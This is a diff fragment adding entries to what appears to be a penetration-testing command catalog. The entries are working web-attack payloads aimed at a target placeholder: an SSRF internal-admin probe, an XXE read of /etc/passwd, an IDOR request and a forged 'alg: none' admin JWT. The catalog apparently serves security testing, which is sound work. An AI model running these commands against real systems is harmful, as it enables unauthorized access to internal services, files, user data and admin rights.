+          "ffuf",
+          "web"
+        ]
+      },
+      {
+        "id": "web_11",
+        "name": "SSRF Internal Probe",
+        "purpose": "Access internal services via SSRF",
+        "when_to_use": "When app fetches URLs based on user input",
+        "command": "curl 'http://{TARGET_IP}/fetch?url=http://127.0.0.1:8080/admin'",
+        "tags": [
+          "ssrf",
+          "web"
+        ]
+      },
+      {
+        "id": "web_12",
+        "name": "XXE File Read",
+        "purpose": "Read local files via XML External Entity",
+        "when_to_use": "When app parses XML input",
+        "command": "curl -X POST 'http://{TARGET_IP}/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'",
+        "tags": [
+          "xxe",
+          "web"
+        ]
+      },
+      {
+        "id": "web_13",
+        "name": "IDOR Test",
+        "purpose": "Access other users' data by changing IDs",
+        "when_to_use": "When object references are in URL/body",
+        "command": "curl -s 'http://{TARGET_IP}/api/user/2' -H 'Cookie: session=YOUR_COOKIE'",
+        "tags": [
+          "idor",
+          "web"
+        ]
+      },
+      {
+        "id": "web_14",
+        "name": "JWT None Algorithm Attack",
+        "purpose": "Bypass JWT signature verification",
+        "when_to_use": "When app uses JWT and doesn't validate alg",
+        "command": "python3 -c \"import base64,json; h=base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('='); p=base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('='); print(f'{h}.{p}.')\"",
+        "tags": [
+          "jwt",
+          "web",
+          "bypass"
+        ]
+      }
+    ]
+  }
+]
